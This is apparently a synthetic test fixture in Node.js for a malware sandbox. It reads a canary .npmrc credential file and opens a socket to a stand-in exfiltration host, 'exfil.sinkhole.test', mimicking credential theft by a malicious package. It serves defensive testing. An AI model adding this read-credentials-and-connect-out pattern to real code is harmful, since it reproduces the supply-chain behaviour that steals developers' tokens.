/**
 * Synthetic sandbox fixture — reads a canary and opens a socket.
 * Detonate only inside sandbox/Docker, never on the host or GHA runner directly.
 */

const fs = require("node:fs");
const net = require("node:net");

fs.readFileSync("/home/sandbox/.npmrc", "utf8");

const socket = net.connect({ port: 443, host: "exfil.sinkhole.test" });
socket.on("error", () => {});
